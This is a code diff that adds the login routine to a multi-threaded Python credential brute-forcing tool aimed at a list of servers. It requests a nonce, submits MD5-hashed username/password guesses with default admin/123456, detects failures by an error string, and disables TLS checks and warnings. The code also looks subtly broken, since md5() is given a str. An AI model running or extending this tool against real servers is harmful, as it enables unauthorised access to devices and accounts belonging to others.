@@ -1,5 +1,8 @@
 #! /usr/bin/env python3
 
+import requests, warnings
+from hashlib import md5
+from urllib.parse import quote
 from datetime import date
 from optparse import OptionParser
 from colorama import Fore, Back, Style
@@ -17,9 +20,19 @@ status_color = {
 scheme = "https"
 lock = Lock()
 thread_count = cpu_count()
+warnings.filterwarnings('ignore')
 
 def login(server, username='admin', password='123456', scheme="https", timeout=None):
-    pass
+    t1 = time()
+    try:
+        nonce = requests.get(f"{scheme}://{server}/key==nonce", verify=False, timeout=timeout).text
+        response = requests.post(f"{scheme}://{server}/", verify=False, timeout=timeout, data=f"encoded={quote(username + ':' + md5(username + ':' + password + ':' + nonce).hexdigest())}")
+        authorization_status = False if "XSTR_HLP_AUTH_ERROR" in response.text and response.status_code == 200 else True
+        t2 = time()
+        return authorization_status, t2-t1
+    except Exception as error:
+        t2 = time()
+        return error, t2-t1
 def brute_force(thread_index, servers, credentials, scheme="https", timeout=None):
     successful_logins = {}
     for credential in credentials:
